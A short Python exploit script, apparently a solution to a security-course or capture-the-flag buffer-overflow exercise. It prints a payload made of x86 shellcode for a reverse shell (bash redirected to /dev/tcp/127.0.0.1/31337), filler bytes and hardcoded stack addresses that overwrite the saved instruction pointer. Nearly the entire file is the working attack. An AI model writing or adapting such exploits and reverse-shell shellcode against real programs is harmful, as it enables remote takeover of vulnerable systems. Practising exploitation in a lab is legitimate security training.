#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# shellcode+=b'\x90'*4

# Payload is /bin/bash -c "bash -I>&/dev/tcp/127.0.0.1/31337 0>&1"
# shellcode=b'j\x0bj\x0bX\x99Rhbashh////h/bin\x89\xe3RS\x89\xe1\xcd\x80#\xd1\xbc'
shellcode=b'1\xc0Phbashh////h/bin\x89\xe3Ph0>&11\xed\x81\xc5\x10\x10\x10\x10\x81\xc5\x10\x10\x10\x10Uh1337h.1/3h.0.0h/127h/tcph/devh-I>&Uhbash\x89\xe5Ph-hhc\x89\xe1PUQS\x89\xe11\xd2S1\xc0@@@@@@@@@@@\xcd\x80'

addr_shell = pack('<I', 0xfffecef8)
addr_EIP = pack('<I', 0xfffed70c)

align = 9-4
pad = 2048-align-1
sys.stdout.buffer.write(b"\'")
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\xFF'*(pad-len(shellcode)))
sys.stdout.buffer.write(b'\xDD' * align)
sys.stdout.buffer.write(addr_shell)  # a
sys.stdout.buffer.write(addr_EIP)  # p
sys.stdout.buffer.write(b"\'")
